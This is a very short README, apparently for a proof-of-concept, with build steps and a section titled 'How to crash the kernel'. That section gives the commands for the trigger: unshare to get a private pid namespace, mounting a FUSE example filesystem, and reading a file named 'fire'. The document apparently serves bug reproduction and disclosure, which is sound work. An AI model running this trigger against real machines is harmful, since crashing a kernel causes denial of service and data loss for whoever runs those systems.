# Build:
```
mkdir build
cd build
cmake ..
make
```

# How to crash the kernel:


```
# If you have unprivileged user namespaces, you can do this under a userns.
sudo unshare --mount-proc -p --propagation=private --fork /bin/bash # This gives us a private pid namespace
mkdir -p /tmp/example
./bin/fuse-example -s -f /tmp/example &
cat /tmp/example/fire
```

